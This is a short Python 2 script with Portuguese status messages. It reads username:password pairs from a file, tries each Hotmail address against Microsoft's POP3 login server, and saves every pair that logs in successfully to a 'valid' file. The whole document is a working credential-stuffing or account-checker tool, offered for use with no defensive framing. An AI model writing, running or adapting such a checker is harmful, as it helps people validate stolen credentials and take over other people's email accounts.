import poplib
 
pwlist = open('hotmail.txt').readlines()
 
for pair in pwlist:
  valid = open('valid.txt', 'a')
  un, pw = pair.strip().split(':')
 
  verifica = un.find('hotmail')
  if verifica > 0 :
    try:
      M = poplib.POP3_SSL('pop3.live.com', 995)
      print M.user(un)
    except:
      print 'Connection error'
 
    try:
      pwmsg = M.pass_(pw)
      print pwmsg
      if pwmsg[0:3] == '+OK':
          valid.write(':'.join([un, pw+'\n']))
          print 'Conta valida:', un, 'found.'
      M.quit()
    except:
      print 'Conta invalida:', un
 
  valid.close()
 
print 'Finished'